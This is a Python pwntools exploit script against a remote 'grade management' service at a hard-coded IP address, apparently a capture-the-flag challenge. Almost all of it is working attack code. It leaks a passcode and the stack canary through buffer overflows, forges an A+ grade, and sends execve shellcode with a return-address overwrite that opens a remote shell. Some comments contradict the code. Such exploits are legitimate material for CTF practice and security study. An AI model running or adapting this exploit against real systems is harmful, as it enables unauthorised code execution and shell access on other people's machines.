from pwn import *

# Set up the remote connection
r = remote('221.149.226.120', 31338)

# Receive the initial message
r.recvuntil(b"[Professor's grade management program]\n\n")

# Step 1: Send option 1 to input student information with maximum values
print("🔥loop1")
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'1')
r.recvuntil(b"enter below informations.\n\n")
r.recvuntil(b"[student number]\n")
r.sendline(b'4369')  # Enter a valid student number
r.recvuntil(b"[name]\n")
r.send(b'A' * 40)  # Fill the name field with maximum characters
r.recvuntil(b"[grade]\n")
r.send(b'B'*4)  # Enter a valid grade (not A+)

# Step 2: Send option 2 to print student information
print("🔥loop2")
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'2')
leaked_passcode1 = r.recvuntil(b'\n')[:-1]
leaked_passcode1 = leaked_passcode1.split(b':')[1].strip()
print("leaked data:", leaked_passcode1)
leaked_passcode1 = leaked_passcode1[40:44]
print("leaked pass code:", leaked_passcode1)
r.recvuntil(b"\n")

print("🔥loop3")
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'1')
r.recvuntil(b"enter below informations.\n\n")
r.recvuntil(b"[student number]\n")
r.sendline(b'2020170365')  # Enter a valid student number
r.recvuntil(b"[name]\n")
r.send(b'gayeong')  # Fill the name field with maximum characters
r.recvuntil(b"[grade]\n")
r.send(b'A+')  # Enter a valid grade (not A+)
r.recvuntil(b"To award an A+ grade, please enter the passcode:\n")
r.sendline(leaked_passcode1)  # Send the leaked passcode

print("🔥loop4")
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'3')
r.recvuntil(b"\n")
r.recvuntil(b"\n")
ex = b'A'*40 # char name[40];
ex += b'B'*4 # char passcode[4];
ex += b'C'*4 #int student_number;
ex += b'A+'*2 #char grade[4];
ex += b'E' # canary first byte buffer
r.send(ex)  # Fill the name field with maximum characters
r.recvuntil(b"\n")
r.recvuntil(b"\n")
leak_stack = r.recvuntil(b'\n')[:-1]
name_pointer = int(leak_stack, 16)
print("leak stack",leak_stack)
print("name_pointer",name_pointer)

# Step 2: Send option 2 to print student information
print("🔥loop5")
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'2')
r.recvuntil(b'E')
leak = r.recv(3)
print("leaked data:", leak)
canary = b"\x00" +leak
print("leaked canary code:", hex(u32(canary)))
r.recvuntil(b"\n")

# Step 2: Send option 2 to print student information
print("🔥loop6")
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'3')
r.recvuntil(b"\n")
r.recvuntil(b"\n")
ex = b'A'*40 # char name[40];
ex += b'B'*4 # char passcode[4];
ex += b'C'*4 #int student_number;
ex += b'A+'*2 #char grade[4];
ex += canary
ex+= b'b'*16 #SFP
r.send(ex)  # Fill the name field with maximum characters
r.recvuntil(b"\n")
r.recvuntil(b"\n")
leak_stack = r.recvuntil(b'\n')[:-1]
name_pointer = int(leak_stack, 16)
print("leak stack",leak_stack)
print("name_pointer",name_pointer)


# Step 2: Send option 2 to print student information
print("🔥loop7")
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'2')
r.recvuntil(b'\n')
r.recvuntil(b"\n")
print("pass:")

# Step 2: Send option 2 to print student information
print("🔥loop8")
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'2')
leaked_passcode1 = r.recvuntil(b'\n')[:-1]
leaked_passcode1 = leaked_passcode1.split(b':')[1].strip()
print("leaked data:", leaked_passcode1)
leaked_passcode1 = leaked_passcode1[40:44]
print("leaked pass code:", leaked_passcode1)
r.recvuntil(b"\n")

# Step 2: Send option 2 to print student information
print("🔥loop9")
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'1')
r.recvuntil(b"enter below informations.\n\n")
r.recvuntil(b"[student number]\n")
r.sendline(b'2020170365')  # Enter a valid student number
r.recvuntil(b"[name]\n")
r.send(b'gayeong')  # Fill the name field with maximum characters
r.recvuntil(b"[grade]\n")
r.send(b'A+')  # Enter a valid grade (not A+)
r.recvuntil(b"To award an A+ grade, please enter the passcode:\n")
r.sendline(leaked_passcode1)  # Send the leaked passcode


print("🔥loop10")
r.recvuntil(b"1: Input\n2: Print info\n3: graduate_school_application\n")
r.sendline(b'3')
r.recvuntil(b"\n")
r.recvuntil(b"\n")
# Shellcode to spawn a shell
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
ex = shellcode + b'a'*(52-len(shellcode))
ex += canary 
ex += b'b'*4 #SFP
ex += p32(name_pointer)  #RET
print("ex", ex)  # buf
r.sendline(ex) 
r.recvuntil(b"\n")
r.recvuntil(b"\n")
leak_stack = r.recvuntil(b'\n')[:-1]
print("leak stack",leak_stack)


# # Interact with the spawned shell
r.interactive()

